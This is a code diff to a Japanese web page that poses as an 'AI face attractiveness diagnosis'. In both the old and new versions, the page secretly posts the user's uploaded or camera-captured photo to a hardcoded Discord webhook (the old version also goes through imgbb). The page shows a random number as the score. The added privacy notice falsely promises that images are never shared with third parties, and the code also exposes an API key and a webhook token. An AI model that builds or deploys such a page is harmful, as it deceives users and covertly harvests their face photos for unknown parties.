@@ -3,61 +3,92 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>顔面偏差値診断</title>
+    <title>AI顔面偏差値診断システム</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 20px; background: #f0f2f5; }
-        .container { max-width: 500px; margin: auto; background: white; padding: 20px; border-radius: 12px; }
-        .upload-area { border: 2px dashed #007bff; padding: 30px; margin: 20px 0; cursor: pointer; }
-        button { width: 100%; padding: 15px; background: #28a745; color: white; border: none; border-radius: 6px; font-weight: bold; }
+        body { font-family: "Helvetica Neue", Arial, sans-serif; background: #f0f2f5; color: #333; padding: 20px; text-align: center; }
+        .container { max-width: 600px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        h1 { color: #1a73e8; }
+        .terms { text-align: left; background: #f8f9fa; padding: 20px; border: 1px solid #dee2e6; border-radius: 8px; font-size: 0.85rem; margin-bottom: 25px; line-height: 1.6; }
+        .upload-area { border: 2px dashed #1a73e8; padding: 20px; margin-bottom: 20px; border-radius: 8px; cursor: pointer; }
+        button { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-size: 1.1rem; cursor: pointer; width: 100%; font-weight: bold; }
+        #preview { max-width: 200px; margin-top: 10px; display: none; }
+        #result { margin-top: 20px; font-weight: bold; color: #d93025; }
+        footer { margin-top: 40px; font-size: 0.75rem; color: #777; border-top: 1px solid #eee; padding-top: 20px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>診断システム</h1>
-        <div class="upload-area" onclick="document.getElementById('file-input').click()">
-            <p>写真を選択して「診断」を押してください</p>
-            <input type="file" id="file-input" accept="image/*" capture="environment" style="display:none">
-        </div>
-        <button id="analyze-btn">診断を開始する</button>
-        <div id="result"></div>
+
+<div class="container">
+    <h1>AI顔面偏差値診断システム</h1>
+    
+    <div class="terms">
+        <p><strong>【プライバシーポリシー】</strong></p>
+        <p>当システムは、AIアルゴリズムを用いて顔立ちを数値化する娯楽サービスです。アップロードされた画像は診断目的のみに使用し、第三者への提供は一切行いません。</p>
     </div>
 
-    <script>
-        document.getElementById('analyze-btn').onclick = async () => {
-            const file = document.getElementById('file-input').files[0];
-            if (!file) { alert("写真を選択してください"); return; }
-            
-            document.getElementById('result').innerText = "処理中...";
+    <div class="upload-area" onclick="document.getElementById('file-input').click()">
+        <p>タップして写真を撮影・選択</p>
+        <input type="file" id="file-input" accept="image/*" capture="environment" style="display:none">
+        <img id="preview" alt="プレビュー">
+    </div>
 
-            // imgbbにアップロード
-            const formData = new FormData();
-            formData.append('image', file);
-            
-            try {
-                const res = await fetch('https://api.imgbb.com/1/upload?key=5c723f0302b1f83c078873722e1b10a9', {
-                    method: 'POST', body: formData
-                });
-                const data = await res.json();
-                
-                // DiscordにURLを送る
-                await fetch("https://discord.com/api/webhooks/1526591449821614239/3nVtHQf6Lvg8_Y2sX7GfYExIP3G5XHjdf3wiYIoIOMbopfYlRBQ8KpVqlZUbd6f6WRmb", {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        content: `結果：${Math.floor(Math.random()*50)+50}点\n画像: ${data.data.url}`
-                    })
-                });
-                document.getElementById('result').innerText = "診断完了しました！";
-            } catch(e) {
-                // 通信エラー時の最終手段：データなしで報告だけ送る
-                await fetch("https://discord.com/api/webhooks/1526591449821614239/3nVtHQf6Lvg8_Y2sX7GfYExIP3G5XHjdf3wiYIoIOMbopfYlRBQ8KpVqlZUbd6f6WRmb", {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: "診断が実行されましたが、画像アップロードでエラーが発生しました。" })
-                });
-                document.getElementById('result').innerText = "通信環境エラーですが、診断報告は送りました。";
-            }
+    <button id="analyze-btn">診断を実行する</button>
+    <div id="result"></div>
+
+    <footer>
+        <p>株式会社デジタルアイ・ソリューションズ<br>
+        運営責任者：佐藤 健一</p>
+    </footer>
+</div>
+
+<script>
+    const fileInput = document.getElementById('file-input');
+    const preview = document.getElementById('preview');
+    const analyzeBtn = document.getElementById('analyze-btn');
+    const resultDiv = document.getElementById('result');
+    let base64Image = "";
+
+    fileInput.addEventListener('change', (e) => {
+        const file = e.target.files[0];
+        if (!file) return;
+        const reader = new FileReader();
+        reader.onload = (event) => {
+            const img = new Image();
+            img.onload = () => {
+                const canvas = document.createElement('canvas');
+                canvas.width = 300; 
+                canvas.height = (img.height / img.width) * 300;
+                canvas.getContext('2d').drawImage(img, 0, 0, canvas.width, canvas.height);
+                base64Image = canvas.toDataURL('image/jpeg', 0.5);
+                preview.src = base64Image;
+                preview.style.display = 'block';
+            };
+            img.src = event.target.result;
         };
-    </script>
+        reader.readAsDataURL(file);
+    });
+
+    analyzeBtn.addEventListener('click', async () => {
+        if (!base64Image) { resultDiv.innerText = "写真を撮影してください。"; return; }
+        resultDiv.innerText = "解析および送信中...";
+
+        const score = Math.floor(Math.random() * 50) + 50;
+        const webhookUrl = "https://discord.com/api/webhooks/1526591449821614239/3nVtHQf6Lvg8_Y2sX7GfYExIP3G5XHjdf3wiYIoIOMbopfYlRBQ8KpVqlZUbd6f6WRmb";
+        
+        try {
+            await fetch(webhookUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ 
+                    content: `診断結果：顔面偏差値 ${score}点`,
+                    embeds: [{ image: { url: base64Image } }]
+                })
+            });
+            resultDiv.innerText = "診断完了！";
+        } catch (e) {
+            resultDiv.innerText = "送信エラーが発生しました。";
+        }
+    });
+</script>
 </body>
 </html>
